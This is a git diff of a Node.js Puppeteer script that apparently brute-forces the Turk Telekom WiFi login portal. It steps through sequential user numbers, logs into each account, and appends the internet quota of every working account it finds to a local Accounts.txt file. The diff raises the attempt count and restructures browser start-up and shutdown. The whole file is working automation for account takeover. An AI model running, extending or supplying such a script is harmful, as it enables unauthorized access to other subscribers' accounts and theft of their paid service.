@@ -1,9 +1,10 @@
 const puppeteer = require("puppeteer");
 const fs = require("fs");
 
-var user = 2110000;
-var howManyTrys = 100;
+var user = 2115236;
+var howManyTrys = 300;
 
+var browser = null;
 var accountFound = false;
 const url = "https://giris.turktelekomwifi.com/#/";
 
@@ -20,34 +21,41 @@ const exitButton = "a[data-autamation=\"cikis\"]";
 const tableContent = "td.alert-link";
 
 async function findInternet(){
-
-	const page = await startBrowser();
+    
+	const page = await startBrowser(true);
 
 	while (howManyTrys !== 0) {
 
-		await navigateSite(page);
-        await fillForm(page);	
-        await exitAccount(page);
-        await showQuota(page);
+        if (howManyTrys !== 0) await navigateSite(page);
+        if (howManyTrys !== 0) await fillForm(page);	
+        if (howManyTrys !== 0) await exitAccount(page);
+        if (howManyTrys !== 0) await showQuota(page);
 	}
 	
-	console.log("Proccess complete\nExiting")
-	await browser.close();
+    await startBrowser(false);
+	
 }
 
-async function startBrowser(){
+async function startBrowser(Start_or_Stop){
 
-	const browser = await puppeteer.launch({
-		headless: true,
-		defaultViewport: null
-	});
+    if (Start_or_Stop){
+        browser = await puppeteer.launch({
+            headless: true,
+            defaultViewport: null
+        });
+    
+        const _page = await browser.newPage();
+    
+        await _page.goto(url,{
+            waitUntil: "domcontentloaded"
+        });
+        return _page;
+    }
+    else  {
+        console.log("Proccess complete\nExiting")
+        await browser.close();
+    }
 
-	const _page = await browser.newPage();
-
-	await _page.goto(url,{
-		waitUntil: "domcontentloaded"
-	});
-	return _page;
 }
 
 async function navigateSite(page){
@@ -114,21 +122,23 @@ async function exitAccount(page){
 	try {
 		await page.waitForSelector(exitButton,{timeout:5000});
 		page.click(exitButton);
-	} catch (error) {
-	}
+	} catch (error) {}
 
 	accountFound = false;
 }
 
 async function showQuota(page) {
 
-	await page.waitForSelector(tableContent);
+    try {
+        await page.waitForSelector(tableContent);
     	var table = await page.evaluate(async() => {
         let tds = Array.from(document.querySelectorAll("td.alert-link"))
         return tds.map(td => td.innerText)
     });
 	console.log(table);
 	fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {});
+    } catch (error) {console.log("This account has no internet available\nExiting")}
+
 }
 
 findInternet();
